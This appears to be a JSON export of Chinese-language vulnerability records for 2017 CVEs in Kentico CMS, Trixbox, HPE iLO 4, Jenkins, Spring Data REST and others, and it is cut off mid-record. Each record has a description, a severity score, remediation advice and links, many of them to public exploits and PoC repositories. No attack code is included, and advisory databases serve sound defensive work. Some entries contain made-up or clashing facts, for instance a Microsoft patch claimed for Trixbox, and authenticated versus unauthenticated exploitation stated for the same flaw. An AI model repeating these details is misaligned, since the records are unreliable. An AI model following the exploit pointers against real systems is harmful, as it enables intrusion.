[{"ave_id":"AVE-2017-0062","file_name":"2017/AVE-2017-0062.toml","cve_id":"CVE-2017-17736","title":"Kentico CMS 访问控制漏洞","description":"Kentico CMS 9.0.51 之前版本及 10.0.48 之前版本的 CMS 管理后台存在访问控制缺陷。未经身份认证的远程攻击者可直接访问 CMSInstall/install.aspx 安装页面，随后导航至 CMS Administration Dashboard，利用该页面缺乏权限校验的漏洞绕过认证机制，从而获取 Global Administrator 全局管理员权限。攻击者可借此完全控制目标 CMS 系统，执行任意管理操作，包括创建用户、修改站点配置、上传恶意文件等。该漏洞无需任何前置权限或用户交互，攻击复杂度低，危害严重。","severity":"CRITICAL","score":9.8,"aliases":["CVE-2017-17736"],"sources":["nuclei"],"published":"2018-03-23T15:29:00Z","updated":"2026-06-17T01:11:33Z","remediation":"立即升级 Kentico CMS 至 9.0.51 或 10.0.48 及以上版本，该漏洞已在上述版本中修复。如无法立即升级，可删除或重命名 CMSInstall 目录下的 install.aspx 文件，或在 Web 服务器（IIS）层面限制对 CMSInstall/install.aspx 的访问权限，仅允许受信 IP 访问该路径。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["https://blog.hivint.com/advisory-access-control-bypass-in-kentico-cms-cve-2017-17736-49e1e43ae55b","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-17736.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-17736.md","https://github.com/nomi-sec/PoC-in-GitHub/blob/7fe82fb470b3291b506f74c6717a29e3837f8a29/2017/CVE-2017-17736.json","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-17736.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/critical/CVE-2017-17736.yaml","https://github.com/CVEProject/cvelistV5/blob/487ea3f21ed49470634e758e1f8f2ac74b64d6b0/cves/2017/17xxx/CVE-2017-17736.json","https://github.com/SleepingBag945/dddd/blob/4c428a7c171275bfbb5fa72c2fb4bd7b48f4ff4a/common/config/pocs/CVE-2017-17736.yaml","https://github.com/sari3l/Poc-Monitor/blob/bf6bcb929801b1884cce701f7fcd855b05f0d401/2017/CVE-2017-17736.json","https://github.com/0x727/FingerprintHub/blob/881db81e73cc7e2f9f510b557401bea4324e5731/plugins/kentico/kentico_cms/CVE-2017-17736.yaml","https://github.com/CVEDB/Poc-Git/blob/0275aeb329b0747c9a1d46160c921eae06095557/2017/CVE-2017-17736.md","https://github.com/cckuailong/reapoc/blob/699762e4c31d0183733f64313d8fc3be6470bd37/2017/CVE-2017-17736/poc/nuclei/CVE-2017-17736.yaml","https://github.com/0xSojalSec/Nuclei-TemplatesNuclei-Templates-CVE-2017-17736"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2017/POC-AVE-2017-0062.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2017/EXP-AVE-2017-0062.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0062.toml"},{"ave_id":"AVE-2017-0042","file_name":"2017/AVE-2017-0042.toml","cve_id":"CVE-2017-14537","title":"Netfortris Trixbox 2.8 目录遍历漏洞","description":"这是一个影响 Netfortris Trixbox 2.8 及以下版本的路径遍历漏洞。攻击者通过发送特制参数利用该漏洞访问目标系统上的敏感文件。具体来说，攻击者可以通过向 `/maint/index.php?packages` 发送包含 `xajaxargs` 参数的请求，或向 `/maint/modules/home/index.php` 发送包含 `lang` 参数的请求，绕过权限验证访问操作系统文件。该漏洞需要攻击者拥有低权限且可远程发起攻击，但却可能导致敏感信息泄露。其 CVSS 评分 6.5，中等严重程度，CWE 编号为 22。微软及其合作伙伴已发布安全补丁修复了此漏洞，建议用户及时更新到安全版本。","severity":"MEDIUM","score":6.5,"aliases":["CVE-2017-14537"],"sources":["nuclei"],"published":"2018-02-16T04:29:00Z","updated":"2026-06-17T01:06:20Z","remediation":"立即将 Trixbox 升级至官方发布的最新可用版本（高于 2.8.0.4），该版本修复了路径遍历漏洞。如暂无法立即升级，可临时修改 /maint/index.php 和 /maint/modules/home/index.php 中对 xajaxargs 和 lang 参数的输入验证逻辑，增加路径规范化检查并过滤包含 ../ 或 ..%2f 等遍历序列的请求；同时关闭 PHP 的 allow_url_fopen 和 display_errors 配置项，并通过 Web 应用防火墙限制对 /maint/ 目录的恶意访问，防止攻击者利用该漏洞读取服务器敏感文件。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://packetstormsecurity.com/files/162853/Trixbox-2.8.0.4-Path-Traversal.html","http://www.securityfocus.com/bid/103007","https://github.com/Hacker5preme/Exploits/tree/main/CVE-2017-14537-Exploit","https://secur1tyadvisory.wordpress.com/2018/02/13/trixbox-multiple-path-traversal-vulnerabilities-cve-2017-14537/","https://www.exploit-db.com/exploits/49914","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-14537.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-14537.md","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-14537.yaml","https://github.com/cckuailong/reapoc/blob/699762e4c31d0183733f64313d8fc3be6470bd37/2017/CVE-2017-14537/poc/pocsploit/CVE-2017-14537.py","https://github.com/linuxadi/40k-nuclei-templates/blob/542be6820c801c02a33aee60f1c05ca7b0b5005f/aditya/folder1/CVE-2017-14537-2.yaml","https://github.com/aquasecurity/vuln-list-nvd/blob/e10d60d68d9699b78a04c3d543f551d2d1328421/api/2017/CVE-2017-14537.json","https://github.com/adampielak/nuclei-templates/blob/a2f3ff3fa5db5c7705ebd942909ec114df063700/nuclei-v2/C/CVE-2017-14537.yaml","https://github.com/emadshanab/nucleiDB/blob/a06eb8edf2853662c304e3f41f8887b65f56e399/cve-2017-14537-2932.yaml","https://github.com/exploit-io/nuclei-templates/blob/a4b7182985a6e45df346cfe45242d40455e152b5/templates/cve-2017-14537-1.yaml","https://github.com/Le4kno3/nuclei-templates/blob/84f3cf36fb3561acbde7fccce3628beb5a86300c/.checksum","https://github.com/0xelixer/new/blob/6f6dd4a43a76ce74c1e8cc0558629a2ea198286e/nuclei-temps/cent/template1/cve-2017-14537-2934.yaml"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0042.toml"},{"ave_id":"AVE-2017-0041","file_name":"2017/AVE-2017-0041.toml","cve_id":"CVE-2017-14535","title":"Trixbox 2.8.0.4 操作系统命令注入漏洞","description":"trixbox 2.8.0.4（一款开源的 VoIP PBX 电话系统）的 `/maint/modules/home/index.php` 页面中，`lang` 参数未对用户输入进行有效过滤，直接拼接至操作系统命令执行，存在 OS 命令注入漏洞（CWE-78）。已认证的远程攻击者可通过在 `lang` 参数中注入 shell 元字符（如分号、管道符等）执行任意系统命令，进而完全控制目标服务器。该漏洞 CVSS 评分 8.8，危害等级高，攻击复杂度低，无需用户交互，成功利用可导致敏感信息泄露、系统被篡改或沦为僵尸网络节点。公开的 ExploitDB 条目（ID 49913）及多个 GitHub PoC 已证实该漏洞可被未认证方式触发，风险极高。","severity":"HIGH","score":8.8,"aliases":["CVE-2017-14535"],"sources":["nuclei"],"published":"2018-02-16T04:29:00Z","updated":"2026-06-17T01:06:20Z","remediation":"trixbox 2.8.0.4 已停止维护，官方不再发布安全更新。建议立即迁移至 FreePBX 或 3CX 等活跃维护的 PBX 系统。临时缓解措施：在 Web 服务器（Apache/Nginx）层面配置 WAF 规则，过滤 /maint/modules/home/index.php 的 lang 参数中的 shell 元字符（; | & ` $ 等）；限制 /maint/ 目录仅允许内网 IP 访问；移除或禁用未使用的 maint 管理模块。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://packetstormsecurity.com/files/162854/Trixbox-2.8.0.4-Remote-Code-Execution.html","http://www.securityfocus.com/bid/103004","https://github.com/Hacker5preme/Exploits/tree/main/CVE-2017-14535-Exploit","https://secur1tyadvisory.wordpress.com/2018/02/11/trixbox-os-command-injection-vulnerability-cve-2017-14535/","https://twitter.com/tiger_tigerboy/status/962689803270500352","https://www.linkedin.com/pulse/trixbox-os-command-injection-vulnerability-sachin-wagh-ceh-ecsa-/?published=t","https://www.exploit-db.com/exploits/49913","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-14535.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-14535.md","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-14535.yaml","https://github.com/cckuailong/reapoc/blob/699762e4c31d0183733f64313d8fc3be6470bd37/2017/CVE-2017-14535/poc/pocsploit/CVE-2017-14535.py","https://github.com/linuxadi/40k-nuclei-templates/blob/542be6820c801c02a33aee60f1c05ca7b0b5005f/aditya/folder3/cve-2017-14535-2929.yaml","https://github.com/CVEProject/cvelist-dev/blob/5b8fbb570438e8094550205589cc6f1d122acc94/2017/14xxx/CVE-2017-14535.json","https://github.com/0xelixer/new/blob/6f6dd4a43a76ce74c1e8cc0558629a2ea198286e/nuclei-temps/Vulnerability-Templates/template2/cve-2017-14535-2930.yaml","https://github.com/capiton0/templates/blob/63af3f97c9a5a5b86416ce7c0d62a8adae7b4a07/cves/2017/CVE-2017-14535.yaml","https://github.com/vito1317/ai-weakness-scan/blob/530cc6a27c6af8957110e6c1f64edc534d36af1b/data/cvelistV5_raw/extracted/cvelistV5-main/cves/2017/14xxx/CVE-2017-14535.json","https://github.com/coreruleset/seaweed-reports/blob/3e2a1bd3dbca1b431f18ed0dabb71fa729d4d059/2022/Oct/16/rceArtifact/rceReport.csv","https://github.com/CyberSecAI/cve_info/blob/03b7e36424574a3a9ba5fd13480a326b666a1046/2017/14xxx/CVE-2017-14535.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0041.toml"},{"ave_id":"AVE-2017-0031","file_name":"2017/AVE-2017-0031.toml","cve_id":"CVE-2017-12544","title":"HPE System Management Homepage 跨站脚本漏洞","description":"HPE System Management Homepage（SMH）Windows/Linux 版本 7.6.0 及之前版本存在跨站脚本（XSS）漏洞。该漏洞源于程序对用户输入参数未进行充分的过滤与转义处理，具有低权限的远程认证攻击者可通过向 SMH Web 管理界面发送特制的 HTTP 请求，诱使目标管理员用户点击恶意链接，从而在受害者的浏览器会话中执行任意 JavaScript 脚本。成功利用该漏洞可导致敏感信息泄露、会话劫持或页面内容篡改，影响服务器的管理安全。CVSS 评分 5.4，危害等级中危。HPE 已在 SMH 7.6.1 版本中修复此漏洞。","severity":"MEDIUM","score":5.4,"aliases":["CVE-2017-12544"],"sources":["nuclei"],"published":"2018-02-15T22:29:04Z","updated":"2026-06-17T01:03:28Z","remediation":"立即将 HPE System Management Homepage 升级至 v7.6.1 或更高版本。HPE 已发布安全公告 hpesbmu03753 提供修复包，可从 HPE 支持中心下载安装。如无法立即升级，可在防火墙或反向代理层面限制仅允许受信任 IP 访问 SMH 管理端口（默认 2381/TCP），并对管理页面启用 HTTP 严格传输安全（HSTS）和 X-Content-Type-Options 头作为临时缓解。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://www.securityfocus.com/bid/101029","http://www.securitytracker.com/id/1039437","https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbmu03753en_us","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-12544.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-12544.md","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-12544.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/medium/cve-2017-12544-2888.yaml","https://github.com/CVEProject/cvelistV5/blob/933422a5f82611777877a3549b9b8e3c7d70117d/cves/2017/12xxx/CVE-2017-12544.json","https://github.com/lianqingsec/NucleiPocGather/blob/dcce204f62196117b9c95c52d8101ccf7a5d27bc/poc/cve/CVE-2017-12544_5.yaml","https://github.com/u21h2/nacs/blob/1eaa239ded7496317a47073605c8ddda70686ef5/web/poc/pocs_dev/nucleibak/cves/2017/CVE-2017-12544.yaml","https://github.com/rix4uni/nucleihub-templates/blob/579a0234551b9e0e322460a62dc77bd6109e4aff/nucleihub-templates/CVE-2017-12544_1.yaml","https://github.com/LiuCan01/cve-list-pro/blob/78b55511cee3604c22d518e32822f0435d0cacc0/cve-list/CVE-2017/CVE-2017-12544","https://github.com/adampielak/nuclei-templates/blob/a2f3ff3fa5db5c7705ebd942909ec114df063700/nuclei-v2/C/cve-2017-12544-2891.yaml","https://github.com/exploit-io/nuclei-templates/blob/a4b7182985a6e45df346cfe45242d40455e152b5/templates/cve-2017-12544-2889.yaml"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0031.toml"},{"ave_id":"AVE-2017-0030","file_name":"2017/AVE-2017-0030.toml","cve_id":"CVE-2017-12542","title":"HPE Integrated Lights-out 4 权限提升和远程代码执行漏洞","description":"HPE Integrated Lights-Out 4（iLO 4）远程管理固件存在认证绕过与代码执行漏洞，版本低于 2.53 均受影响。未经身份认证的远程攻击者可利用该漏洞绕过登录认证，直接添加新的管理员账户并获取 iLO 管理接口的完全控制权限，进而执行任意代码、修改系统配置或窃取敏感信息。攻击无需用户交互，CVSS 评分 10.0，危害等级严重。HP 已在 iLO 4 固件 2.53 版本中修复此漏洞。","severity":"CRITICAL","score":10.0,"aliases":["CVE-2017-12542"],"sources":["nuclei"],"published":"2018-02-15T22:29:04Z","updated":"2026-06-17T01:03:28Z","remediation":"立即将 HPE Integrated Lights-out 4 (iLO 4) 固件升级至 2.53 或更高版本。升级路径：登录 iLO Web 界面 → 固件更新 → 上传 2.53 及以上版本固件文件。如无法立即升级，可在网络层面限制对 iLO 管理端口（默认 443/80）的访问，仅允许受信任的管理 IP 段连接，并禁用 iLO 的远程控制台功能作为临时缓解措施。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://www.securityfocus.com/bid/100467","http://www.securitytracker.com/id/1039222","https://support.hpe.com/hpsc/doc/public/display?docId=emr_na-hpesbhf03769en_us","https://www.exploit-db.com/exploits/44005/","https://www.exploit-db.com/exploits/44005","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-12542.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-12542.md","https://github.com/nomi-sec/PoC-in-GitHub/blob/d0611a30d788ecc6797a40a15a38427bf0c3c17b/2017/CVE-2017-12542.json","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-12542.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/critical/cve-2017-12542-2886.yaml","https://github.com/arschlochnop/VulnWatchdog/blob/50f657ad5d1fd5bd0d62718361ee31e898f44d48/data/2017/CVE-2017-12542-sk1dish_ilo4-rce-vuln-scanner.md","https://github.com/linuxadi/40k-nuclei-templates/blob/542be6820c801c02a33aee60f1c05ca7b0b5005f/aditya/folder2/cve-2017-12542-2887.yaml","https://github.com/adampielak/nuclei-templates/blob/a2f3ff3fa5db5c7705ebd942909ec114df063700/nuclei-v2/C/cve-2017-12542-2885.yaml","https://github.com/GhostTroops/scan4all/blob/fff03b51bf79c8993a46c1da766ec993e1102c47/config/51pwn/TPALL/ARPSyndicate/nuclei/cvescan/critical/CVE-2017-12542.yaml","https://github.com/daffainfo/AllAboutBugBounty/blob/0a16c9d981a270ba20730ad36475ed7ce7ceb79e/Reconnaissance/Shodan%20Dorks.md","https://github.com/exploit-io/nuclei-templates/blob/a4b7182985a6e45df346cfe45242d40455e152b5/templates/cve-2017-12542-2887.yaml","https://github.com/skelsec/CVE-2017-12542","https://github.com/sk1dish/ilo4-rce-vuln-scanner","https://github.com/VijayShankar22/CVE-2017-12542","https://github.com/Gill-Singh-A/CVE-2017-12542-Exploit"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2017/POC-AVE-2017-0030.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2017/EXP-AVE-2017-0030.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0030.toml"},{"ave_id":"AVE-2017-0168","file_name":"2017/AVE-2017-0168.toml","cve_id":"CVE-2017-1000353","title":"Jenkins CI 反序列化远程代码执行漏洞","description":"Jenkins CI 2.56及更早版本以及2.46.1 LTS及更早版本中存在反序列化远程代码执行漏洞。未经身份认证的远程攻击者可通过Jenkins CLI向目标服务器发送特制的序列化Java `SignedObject`对象，服务器在反序列化时使用新的`ObjectInputStream`，绕过了原有的黑名单防护机制，导致任意代码执行。该漏洞影响广泛部署的Jenkins持续集成服务器，CVSS评分9.8，危害等级严重。攻击者无需任何权限即可远程触发，成功利用后可完全控制目标服务器。官方通过将`SignedObject`加入黑名单并弃用基于Java序列化的CLI协议来修复此漏洞。","severity":"CRITICAL","score":9.8,"aliases":["CVE-2017-1000353"],"sources":["nuclei"],"published":"2018-01-29T17:29:00Z","updated":"2026-06-17T00:59:00Z","remediation":"升级 Jenkins 至 2.46.2 LTS 或 2.54 及以上版本（2.56 以下版本均受影响）。如无法立即升级，在 Jenkins 启动参数中添加 `-Dhudson.cli.CLIProtocol.enabled=false` 禁用基于 remoting 的 CLI 协议，并在网络层面限制对 Jenkins CLI 端口（50000）的未授权访问。","status":"completed","collected_at":"2026-07-27T00:00:00Z","references":["http://packetstormsecurity.com/files/159266/Jenkins-2.56-CLI-Deserialization-Code-Execution.html","http://www.securityfocus.com/bid/98056","https://jenkins.io/security/advisory/2017-04-26/","https://www.exploit-db.com/exploits/41965/","https://www.oracle.com/security-alerts/cpuapr2022.html","https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2017-1000353","https://www.exploit-db.com/exploits/41965","https://github.com/projectdiscovery/nuclei-templates/blob/main/code/cves/2017/CVE-2017-1000353.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-1000353.md","https://github.com/vulhub/vulhub/blob/aeaf65793f147f29bd50841ef77f4e9cad07ecc7/jenkins/CVE-2017-1000353/README.md","https://github.com/nomi-sec/PoC-in-GitHub/blob/d0611a30d788ecc6797a40a15a38427bf0c3c17b/2017/CVE-2017-1000353.json","https://github.com/Threekiii/Awesome-POC/blob/0f9e22b660cb1ea12c1c3668f9128d93e08da412/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/Jenkins-CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-1000353.md","https://github.com/qazbnm456/awesome-cve-poc/blob/fc862e38e03ea68cdc62618d14891a426daff1a4/CVE-2017-1000353.md","https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/f4596359a8b7b31ae4d231eeaec711706b892ed2/docs/wiki/webserver/Jenkins/Jenkins%20CI%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2017-1000353.md","https://github.com/nixawk/labs/blob/ce800ddc00a8bbf716afe754a1e81e58570b8c50/CVE-2017-1000353/exploit.py","https://github.com/0x727/FingerprintHub/blob/881db81e73cc7e2f9f510b557401bea4324e5731/plugins/jenkins/jenkins/CVE-2017-1000353.yaml","https://github.com/Metarget/metarget/blob/3cd1d6256fbc0e9a7b82d8449ded87f76340af27/vulns_app/jenkins/CVE-2017-1000353/cve-2017-1000353-jenkins-service.yaml","https://github.com/lal0ne/vulnerability/blob/5b9f397c1970203b1764fb7a66a0ffac39bef4cc/Jenkins/CVE-2017-1000353/pom.xml","https://github.com/vulhub/CVE-2017-1000353","https://github.com/r00t4dm/Jenkins-CVE-2017-1000353"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2017/POC-AVE-2017-0168.toml"],"repo_exp_urls":["https://raw.githubusercontent.com/adysec/AVE/main/exploits/2017/EXP-AVE-2017-0168.toml"],"has_poc":true,"has_exp":true,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0168.toml"},{"ave_id":"AVE-2017-0064","file_name":"2017/AVE-2017-0064.toml","cve_id":"CVE-2017-18024","title":"AvantFAX Script Parameter 跨站脚本攻击漏洞","description":"AvantFAX 3.3.3 版本存在跨站脚本攻击（XSS）漏洞，由于对默认 URI 中的参数名未进行充分过滤，攻击者可通过构造包含 Script 元素的任意参数名并发送到目标站点，在受害用户的浏览器中执行恶意 JavaScript 代码。该漏洞影响部署 AvantFAX 3.3.3 的所有在线传真管理系统，攻击条件为需要诱骗具有管理员权限的认证用户点击包含精心构造 URI 的链接，成功利用后可导致管理员会话令牌被窃取、会话劫持及敏感数据泄露等风险。攻击者无需身份认证即可向默认 URI 提交恶意参数，利用方式可引用公开 PoC 模板进行验证和检测。","severity":"MEDIUM","score":6.1,"aliases":["CVE-2017-18024"],"sources":["nuclei"],"published":"2018-01-10T18:29:01Z","updated":"2026-06-17T01:12:03Z","remediation":"立即将 AvantFAX 升级至 3.3.7 或更高版本，该版本修复了参数名中注入 SCRIPT 标签导致的跨站脚本漏洞。若暂无法升级，请在应用层对所有 HTTP 请求参数名进行 HTML 实体编码与输入过滤，拒绝包含尖括号及 script 关键字的参数请求。同时在 Web 服务器中启用 Content-Security-Policy 响应头（设置 default-src 'self'，script-src 'self'），并在应用程序层面为会话 Cookie 添加 HttpOnly 与 Secure 属性，以降低 XSS 攻击造成的会话劫持与信息泄露风险。","status":"completed","collected_at":"2026-07-28T00:00:00Z","references":["http://packetstormsecurity.com/files/145776/AvantFAX-3.3.3-Cross-Site-Scripting.html","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-18024.yaml","https://github.com/trickest/cve/blob/be44b05b9428dc18bc0705cf60dd8d8640cd49b1/2017/CVE-2017-18024.md","https://github.com/projectdiscovery/nuclei-templates/blob/4924c84cac6ce9772babf48587bed8df9d0040d0/http/cves/2017/CVE-2017-18024.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/medium/CVE-2017-18024.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/medium/cve-2017-18024-2992.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/medium/cve-2017-18024-2989.yaml","https://github.com/ExpLangcn/NucleiTP/blob/2b7ecb9031a6eda4f272793045f29b339d8e0cce/CVES/medium/cve-2017-18024-2990.yaml","https://github.com/cckuailong/reapoc/blob/699762e4c31d0183733f64313d8fc3be6470bd37/2017/CVE-2017-18024/poc/pocsploit/CVE-2017-18024.py","https://github.com/GhostTroops/scan4all/blob/fff03b51bf79c8993a46c1da766ec993e1102c47/config/51pwn/yaml/AvantFAX/CVE-2017-18024.yaml","https://github.com/GhostTroops/scan4all/blob/fff03b51bf79c8993a46c1da766ec993e1102c47/config/51pwn/TPALL/cves/2017/CVE-2017-18024.yaml","https://github.com/CVEProject/cvelistV5/blob/487ea3f21ed49470634e758e1f8f2ac74b64d6b0/cves/2017/18xxx/CVE-2017-18024.json"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":["https://raw.githubusercontent.com/adysec/AVE/main/pocs/2017/POC-AVE-2017-0064.toml"],"repo_exp_urls":[],"has_poc":true,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0064.toml"},{"ave_id":"AVE-2017-0127","file_name":"2017/AVE-2017-0127.toml","cve_id":"CVE-2017-8046","title":"Pivotal Spring Data REST 远程代码执行漏洞","description":"Pivotal Spring Data REST 在处理 PATCH 请求时存在输入校验不足，攻击者可向受影响服务提交特制 JSON 数据（如含 SpEL 表达式的 JSON Patch），在目标服务器上执行任意 Java 代码，进而实现远程代码执行。该漏洞影响 Spring Data REST 2.6.9（Ingalls SR9）之前、3.0.1（Kay SR1）之前版本，以及 Spring Boot 1.5.9、2.0 M6 之前版本。攻击无需身份认证，通过网络发送恶意 PATCH 请求即可利用，CVSS 评分 9.8，危害等级严重。","severity":"CRITICAL","score":9.8,"aliases":["CVE-2017-8046"],"sources":["nuclei"],"published":"2018-01-04T06:29:00Z","updated":"2026-06-26T18:44:14Z","remediation":"立即将 Spring Data REST 升级至 2.6.9（Ingalls SR9）或 3.0.1（Kay SR1）及以上版本；若使用 Spring Boot，请升级至 1.5.9 或 2.0 M6 及以上版本。无法立即升级时，可在网关/防火墙禁用对 Spring Data REST 接口的 PATCH 方法，或限制仅可信来源可访问相关 REST 端点作为临时缓解。","status":"completed","collected_at":"2026-07-28T00:00:00Z","references":["http://www.securityfocus.com/bid/100948","https://access.redhat.com/errata/RHSA-2018:2405","https://pivotal.io/security/cve-2017-8046","https://www.exploit-db.com/exploits/44289/","https://www.exploit-db.com/exploits/44289","https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2017/CVE-2017-8046.yaml","https://github.com/trickest/cve/blob/b3a270a001a31742516eaea5c494f365de9d3c80/2017/CVE-2017-8046.md","https://github.com/vulhub/vulhub/blob/aeaf65793f147f29bd50841ef77f4e9cad07ecc7/spring/CVE-2017-8046/README.md","https://github.com/vulhub/vulhub/blob/aeaf65793f147f29bd50841ef77f4e9cad07ecc7/spring/CVE-2017-8046/README.zh-cn.md","https://github.com/fofapro/vulfocus/blob/4b7a2eaacce4ed770f289e6e72f7240da1e16c74/writeup/CVE-2017-8046/CVE-2017-8046.md","https://github.com/nomi-sec/PoC-in-GitHub/blob/b859fc75b332184195f1952ddeea761c6913ce9b/2017/CVE-2017-8046.json","https://github.com/projectdiscovery/nuclei-templates/blob/3887f9deba3194900fbfb1022d8155887325c384/http/cves/2017/CVE-2017-8046.yaml","https://github.com/Threekiii/Awesome-POC/blob/0f9e22b660cb1ea12c1c3668f9128d93e08da412/开发框架漏洞/Spring Data Rest 远程命令执行漏洞 CVE-2017-8046.md","https://github.com/wgpsec/AboutSecurity/blob/f3c8574e6fa1f9c1cd5aeaba5a209af796107b34/Vuln/middleware/spring/CVE-2017-8046.md","https://github.com/Threekiii/Vulnerability-Wiki/blob/b32b83c01eabac4d6b4b334852be9cff76ba67ee/docs-base/docs/framework/Spring-Data-Rest-远程命令执行漏洞-CVE-2017-8046.md","https://github.com/lal0ne/vulnerability/blob/5b9f397c1970203b1764fb7a66a0ffac39bef4cc/Spring/CVE-2017-8046/README.md","https://github.com/m3ssap0/spring-break_cve-2017-8046","https://github.com/m3ssap0/SpringBreakVulnerableApp","https://github.com/cved-sources/cve-2017-8046","https://github.com/FixYourFace/SpringBreakPoC","https://github.com/jkutner/spring-break-cve-2017-8046"],"poc_urls":[],"exp_urls":[],"repo_poc_urls":[],"repo_exp_urls":[],"has_poc":false,"has_exp":false,"raw_url":"https://github.com/adysec/AVE/blob/main/vulns/2017/AVE-2017-0127.toml"},{"ave_id":"AVE-2017-0198","file_name":"2017/AVE-2017-0198.toml","cve_id":"CVE-2017-1000486","title":"Primetek Primefaces 远程代码执行漏洞","description":"PrimeFaces 5.x 版本中存在弱加密漏洞（CWE-326），其 ViewState 加密密钥使用固定或可预测的密钥，未经身份认证的远程攻击者可通过构造特制的恶意序列化对象发送至目标服务器，触发 Java 反序列化导致远程代码执行。该漏洞影响 PrimeFaces 5.x 全系列版本，CVSS 评分 9.8，危害等级严重。官方已在 GitHub Issue #1152 中确认并修复，建议升级至 6.0 及以上版本。","severity":"CRITICAL","score":9.8,"aliases":["CVE-2017-1000486"],"sources":["nuclei"],"published":"2018-01-03T20:29:00Z","updated":"2026-06-17T00:59:15Z","remediation":"立即将 PrimeFaces 升级至 5.2.21 或 5.3.8 及以上版本，该漏洞源于弱加密算法（CWE-326）导致攻击者可伪造加密数据触发反序列化远程代码执行。如无法立即升级，可在 